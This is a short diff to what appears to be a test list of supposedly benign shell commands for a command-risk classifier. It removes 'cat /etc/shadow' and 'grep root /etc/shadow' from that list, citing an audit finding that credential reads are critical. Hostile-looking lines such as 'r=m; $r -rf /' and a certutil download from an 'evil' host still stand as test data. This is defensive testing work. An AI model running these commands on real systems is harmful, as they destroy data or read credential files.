@@ -160,9 +160,9 @@ _BENIGN = [
     "r=rm; echo $r",
     "r=m; $r -rf /",
     'alias clean="rm -rf node_modules"; clean ./src',
-    # 敏感文件读取 -> 应为 HIGH flag 而非 critical/block (读取非破坏)
-    "cat /etc/shadow",
-    "grep root /etc/shadow",
+    # 审计 P1-15: 凭证读取 (cat /etc/shadow / grep root /etc/shadow) 与毁灭
+    # 操作同级判 critical —— 不再作为「良性 HIGH」列入本清单 (原注释自称
+    # 「读取非破坏」, 但凭证外泄危害等同文件系统毁灭, is_hard_redline 亦如此)。
     # Windows 良性
     "certutil -urlcache http://evil/x.json C:\\Temp\\x.json",
     "certutil -hashfile C:\\Temp\\x.exe MD5",
